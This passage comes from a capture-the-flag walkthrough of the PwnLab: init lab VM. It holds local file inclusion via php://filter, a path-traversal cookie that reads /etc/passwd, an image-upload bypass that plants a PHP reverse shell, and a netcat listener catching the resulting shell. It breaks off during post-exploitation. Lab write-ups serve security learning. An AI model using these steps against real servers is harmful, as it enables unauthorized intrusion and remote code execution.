+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
+</span><span class='line'>current user:    <span class="s1">&#39;root@%&#39;</span>
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> current user is DBA
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1142, <span class="s2">&quot;SELECT command denied to user &#39;root&#39;@&#39;10.1.1.132&#39; for table &#39;user&#39;&quot;</span><span class="o">)</span>
+</span><span class='line'>current user is DBA:    False
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 22:37:40
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Due to the current user is not DBA, I could not write file via MySQL ROOT account.</p>
+
+<p>After login as user <code>kane</code>, I&rsquo;m trying to upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">php reverse shell</a>, but the web application only accept image files.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/1.png"></p>
+
+<p>In order to bypass the file extention limit, I downloaded the file <code>upload.php</code> by using the previouse LFI exploition method.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>upload
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>&lt;head&gt;
+</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
+</span><span class='line'>&lt;/head&gt;
+</span><span class='line'>&lt;body&gt;
+</span><span class='line'>&lt;center&gt;
+</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
+</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
+</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
+</span><span class='line'>PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyJ10pKSB7IGRpZSgnWW91IG11c3QgYmUgbG9nIGluLicpOyB9DQo/Pg0KPGh0bWw+DQoJPGJvZHk+DQoJCTxmb3JtIGFjdGlvbj0nJyBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCQkJPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpbGUnIGlkPSdmaWxlJyAvPg0KCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJy8+DQoJCTwvZm9ybT4NCgk8L2JvZHk+DQo8L2h0bWw+DQo8P3BocCANCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7DQoJaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA8PSAwKSB7DQoJCSRmaWxlbmFtZSAgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsNCgkJJGZpbGV0eXBlICA9ICRfRklMRVNbJ2ZpbGUnXVsndHlwZSddOw0KCQkkdXBsb2FkZGlyID0gJ3VwbG9hZC8nOw0KCQkkZmlsZV9leHQgID0gc3RycmNocigkZmlsZW5hbWUsICcuJyk7DQoJCSRpbWFnZWluZm8gPSBnZXRpbWFnZXNpemUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddKTsNCgkJJHdoaXRlbGlzdCA9IGFycmF5KCIuanBnIiwiLmpwZWciLCIuZ2lmIiwiLnBuZyIpOyANCg0KCQlpZiAoIShpbl9hcnJheSgkZmlsZV9leHQsICR3aGl0ZWxpc3QpKSkgew0KCQkJZGllKCdOb3QgYWxsb3dlZCBleHRlbnNpb24sIHBsZWFzZSB1cGxvYWQgaW1hZ2VzIG9ubHkuJyk7DQoJCX0NCg0KCQlpZihzdHJwb3MoJGZpbGV0eXBlLCdpbWFnZScpID09PSBmYWxzZSkgew0KCQkJZGllKCdFcnJvciAwMDEnKTsNCgkJfQ0KDQoJCWlmKCRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvZ2lmJyAmJiAkaW1hZ2VpbmZvWydtaW1lJ10gIT0gJ2ltYWdlL2pwZWcnICYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvanBnJyYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvcG5nJykgew0KCQkJZGllKCdFcnJvciAwMDInKTsNCgkJfQ0KDQoJCWlmKHN1YnN0cl9jb3VudCgkZmlsZXR5cGUsICcvJyk+MSl7DQoJCQlkaWUoJ0Vycm9yIDAwMycpOw0KCQl9DQoNCgkJJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gbWQ1KGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkuJGZpbGVfZXh0Ow0KDQoJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkZmlsZSkpIHsNCgkJCWVjaG8gIjxpbWcgc3JjPVwiIi4kdXBsb2FkZmlsZS4iXCI+PGJyIC8+IjsNCgkJfSBlbHNlIHsNCgkJCWRpZSgnRXJyb3IgNCcpOw0KCQl9DQoJfQ0KfQ0KDQo/Pg<span class="o">==</span>&lt;/center&gt;
+</span><span class='line'>&lt;/body&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After decoded the base64 code, I got the following <code>upload.php</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php
+</span><span class='line'>session_start<span class="o">()</span><span class="p">;</span>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user&#39;</span><span class="o">]))</span> <span class="o">{</span> die<span class="o">(</span><span class="s1">&#39;You must be log in.&#39;</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>  &lt;body&gt;
+</span><span class='line'>      &lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">&#39;&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s1">&#39;post&#39;</span> <span class="nv">enctype</span><span class="o">=</span><span class="s1">&#39;multipart/form-data&#39;</span>&gt;
+</span><span class='line'>          &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> /&gt;
+</span><span class='line'>          &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">value</span><span class="o">=</span><span class="s1">&#39;Upload&#39;</span>/&gt;
+</span><span class='line'>      &lt;/form&gt;
+</span><span class='line'>  &lt;/body&gt;
+</span><span class='line'>&lt;/html&gt;
+</span><span class='line'>&lt;?php
+</span><span class='line'><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;submit&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span><span class='line'>  <span class="k">if</span> <span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;error&#39;</span><span class="o">]</span> &lt;<span class="o">=</span> 0<span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>      <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">]</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;type&#39;</span><span class="o">]</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$file_ext</span>  <span class="o">=</span> strrchr<span class="o">(</span><span class="nv">$filename</span>, <span class="s1">&#39;.&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$imageinfo</span> <span class="o">=</span> getimagesize<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">])</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$whitelist</span> <span class="o">=</span> array<span class="o">(</span><span class="s2">&quot;.jpg&quot;</span>,<span class="s2">&quot;.jpeg&quot;</span>,<span class="s2">&quot;.gif&quot;</span>,<span class="s2">&quot;.png&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="o">(</span>!<span class="o">(</span>in_array<span class="o">(</span><span class="nv">$file_ext</span>, <span class="nv">$whitelist</span><span class="o">)))</span> <span class="o">{</span>
+</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>      <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$filetype</span>,<span class="s1">&#39;image&#39;</span><span class="o">)</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 001&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>      <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="o">(</span><span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/png&#39;</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 002&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>      <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="o">(</span>substr_count<span class="o">(</span><span class="nv">$filetype</span>, <span class="s1">&#39;/&#39;</span><span class="o">)</span>&gt;1<span class="o">){</span>
+</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 003&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>      <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> . md5<span class="o">(</span>basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">]))</span>.<span class="nv">$file_ext</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">]</span>, <span class="nv">$uploadfile</span><span class="o">))</span> <span class="o">{</span>
+</span><span class='line'>          <span class="nb">echo</span> <span class="s2">&quot;&lt;img src=\&quot;&quot;</span>.<span class="nv">$uploadfile</span>.<span class="s2">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span><span class='line'>          die<span class="o">(</span><span class="s1">&#39;Error 4&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>      <span class="o">}</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>?&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here, this <code>***.gif</code> file is the php reverse shell.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/2.png"></p>
+
+<p>Now the evil php has been uploaded and I have to find a way to trigger it. So I download the <code>index.php</code> to have a check.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>&lt;head&gt;
+</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
+</span><span class='line'>&lt;/head&gt;
+</span><span class='line'>&lt;body&gt;
+</span><span class='line'>&lt;center&gt;
+</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
+</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
+</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
+</span><span class='line'>PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4<span class="o">=</span>&lt;/center&gt;
+</span><span class='line'>&lt;/body&gt;
+</span><span class='line'>&lt;/html&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php
+</span><span class='line'>//Multilingual. Not implemented yet.
+</span><span class='line'>//setcookie<span class="o">(</span><span class="s2">&quot;lang&quot;</span>,<span class="s2">&quot;en.lang.php&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">&#39;lang&#39;</span><span class="o">]))</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>  include<span class="o">(</span><span class="s2">&quot;lang/&quot;</span>.<span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">&#39;lang&#39;</span><span class="o">])</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>// Not implemented yet.
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>&lt;head&gt;
+</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
+</span><span class='line'>&lt;/head&gt;
+</span><span class='line'>&lt;body&gt;
+</span><span class='line'>&lt;center&gt;
+</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
+</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
+</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
+</span><span class='line'>&lt;?php
+</span><span class='line'>  <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]))</span>
+</span><span class='line'>  <span class="o">{</span>
+</span><span class='line'>      include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]</span>.<span class="s2">&quot;.php&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>  <span class="o">{</span>
+</span><span class='line'>      <span class="nb">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;/center&gt;
+</span><span class='line'>&lt;/body&gt;
+</span><span class='line'>&lt;/html&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the source code of <code>index.php</code>, I noticed another one LFI vulnerability on <code>set cookie</code> header.</p>
+
+<p>so in order to approve this LFI is working, I requested the <code>index.php</code> file and used <code>burp proxy</code> to modify <code>Cookie</code> header as follow:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>GET /index.php HTTP/1.1
+</span><span class='line'>Host: 10.1.1.140
+</span><span class='line'>User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:45.0<span class="o">)</span> Gecko/20100101 Firefox/45.0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+</span><span class='line'>Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>Cookie: <span class="nv">lang</span><span class="o">=</span>../../../../../../../../../etc/passwd
+</span><span class='line'>Connection: close
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The following response proved that the LFI vulnerability exists and works:</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/3.png"></p>
+
+<p>Now I set up <code>NC</code> to listen on port 443 and then trigger the shell to connect back.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/4.png"></p>
+
+<p>Great! got in~</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# nc -lvnp 443
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.140<span class="o">]</span> 51503
+</span><span class='line'>Linux pwnlab 3.16.0-4-686-pae <span class="c">#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</span>
+</span><span class='line'> 08:21:09 up <span class="m">1</span> day, 23:06,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
+</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'>/
+</span><span class='line'><span class="nv">$ </span>ls -al home
+</span><span class='line'>total 24
+</span><span class='line'>drwxr-xr-x  <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 .
+</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
+</span><span class='line'>drwxr-x---  <span class="m">2</span> john john <span class="m">4096</span> Mar <span class="m">17</span> 09:57 john
+</span><span class='line'>drwxr-x---  <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 kane
+</span><span class='line'>drwxr-x---  <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 kent
+</span><span class='line'>drwxr-x---  <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 mike
+</span><span class='line'><span class="nv">$ </span>ifconfig
+</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:11:ce:27
+</span><span class='line'>          inet addr:10.1.1.140  Bcast:10.1.1.255  Mask:255.255.255.0
+</span><span class='line'>          inet6 addr: fe80::20c:29ff:fe11:ce27/64 Scope:Link
+</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span><span class='line'>          RX packets:150222 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:75016 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          collisions:0 txqueuelen:1000
